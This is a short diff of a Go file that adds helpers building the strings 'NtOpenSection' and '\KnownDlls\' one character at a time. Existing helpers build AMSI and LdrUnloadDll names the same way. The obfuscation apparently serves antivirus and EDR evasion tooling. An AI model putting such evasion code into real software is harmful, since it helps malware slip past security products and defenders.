@@ -109,3 +109,9 @@ func sAmsiInitialize() string {
 func sLdrUnloadDll() string {
 	return stackStr('L', 'd', 'r', 'U', 'n', 'l', 'o', 'a', 'd', 'D', 'l', 'l')
 }
+func sNtOpenSection() string {
+	return stackStr('N', 't', 'O', 'p', 'e', 'n', 'S', 'e', 'c', 't', 'i', 'o', 'n')
+}
+func sKnownDllsPath() string {
+	return stackStr('\\', 'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's', '\\')
+}
